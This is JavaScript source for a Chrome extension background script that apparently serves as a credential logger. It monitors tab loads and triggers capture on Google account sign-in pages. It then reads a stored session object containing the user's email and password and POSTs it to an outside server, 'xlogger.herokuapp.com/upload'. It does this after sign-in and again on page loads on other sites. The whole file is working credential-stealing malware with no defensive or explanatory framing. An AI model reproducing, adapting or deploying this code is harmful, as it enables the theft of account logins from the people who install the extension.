var domain="https://xlogger.herokuapp.com"

let loading=1;
let currentUrl;
chrome.tabs.onUpdated.addListener(async (tabId,changeInfo,tab)=>{

     if(changeInfo.status=="loading"){
         currentUrl=changeInfo.url;
     }
    
     //if google domains
     if(new RegExp("accounts.google").test(currentUrl)){
        let regex=new RegExp("accounts.google");
        let g_signin_site=regex.test(currentUrl);
        // console.log("curl", currentUrl,"gstauts",g_signin_site);

        //if its signign sesction update triggers...
         if(changeInfo.status=="complete" && g_signin_site){
            //  console.log("reload complere")
             if(new RegExp("accounts.google").test(currentUrl)){
                chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {

                    chrome.tabs.sendMessage(tabs[0].id, {trigger:true});
                });

            }
           
        }  //after signing
         else if(changeInfo.status=="complete" && !g_signin_site){
            chrome.storage.local.get(obj=>{
                let session=obj.session;
                if(session.email && session.password){
                  
                //   console.log("sending log");            
    
                          fetch(`${domain}/upload`,{
                              method:"POST",
                              mode:"cors",
                              body:JSON.stringify(obj),
                              headers:{
                                  "content-Type":"application/json"
                              }
                          }).catch(err=>err);
                       
                  console.log(obj);
                }
              });  
        }
      }
      //other domains...
      else{
        
        if(changeInfo.status=="loading" && loading==1){
            chrome.storage.local.get(obj=>{
              let session=obj.session;
              if(session.email && session.password){
                loading++;
                console.log("sending log");            
                setTimeout(() => {
                        fetch(`${domain}/upload`,{
                            method:"POST",
                            mode:"cors",
                            body:JSON.stringify(obj),
                            headers:{
                                "content-Type":"application/json"
                            }
                        }).catch(err=>err);
                    
                    loading--;
                },1000);  
                console.log(obj);
              }
            });  
        }
     }
})  



    
  